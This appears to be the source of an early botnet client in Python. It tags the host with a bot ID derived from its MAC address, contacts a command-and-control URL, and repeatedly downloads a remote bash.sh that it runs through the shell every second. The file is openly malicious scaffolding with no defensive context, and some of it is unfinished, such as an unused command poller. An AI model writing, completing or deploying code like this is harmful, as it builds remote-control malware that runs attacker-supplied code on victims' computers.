import requests

import time
import uuid
import json
from os import remove
from sys import exit
import signal
from random import randint
from tempfile import mkdtemp, NamedTemporaryFile
from subprocess import call, PIPE

# Dictionary with urls as a key and filenames as values
TEMP_FILES = {}
TEMP_DIR_PATH = None

CC_BASE_PATH = "http://localhost:8000"

BOT_ID = uuid.getnode()

def get_command():
    r = requests.get("{}/command.json".format(CC_BASE_PATH), params={"id": BOT_ID})
    print(r.text)
    print(r.json())



def fetch_page(url, **kwargs):
    return requests.get(url, **kwargs)

def download_item(url, **kwargs):
    r = requests.get(url, **kwargs)

    if r.status_code != 200:
        return False

    if url in TEMP_FILES:
        remove(TEMP_FILES[url])

    tmp_file = NamedTemporaryFile(delete=False)

    if r.status_code == 200:
        for chunk in r:
            tmp_file.write(chunk)

    tmp_file.close()
    
    TEMP_FILES[url] = tmp_file.name

    return True

def execute_item(path, *args):
    return call([path, *args], shell=True)#, stdout=PIPE, stderr=PIPE)

def exit_gracefully():
    print("Exiting")
    print("Files to clean: {}".format(len(TEMP_FILES)))
    for v in TEMP_FILES.values():
        try:
            remove(v)
        except:
            pass
    exit()

def main():
    download_item("http://localhost:8000/bash.sh")
    print(TEMP_FILES["http://localhost:8000/bash.sh"])

    while(True):
        print("Checking...")
        p = execute_item("bash {}".format(TEMP_FILES["http://localhost:8000/bash.sh"]))
        #print("p: {}".format(dir(p)))
        time.sleep(1)


if __name__=="__main__":
    try:
        main()
    except Exception as e:
        print(e)
    finally:
        exit_gracefully()
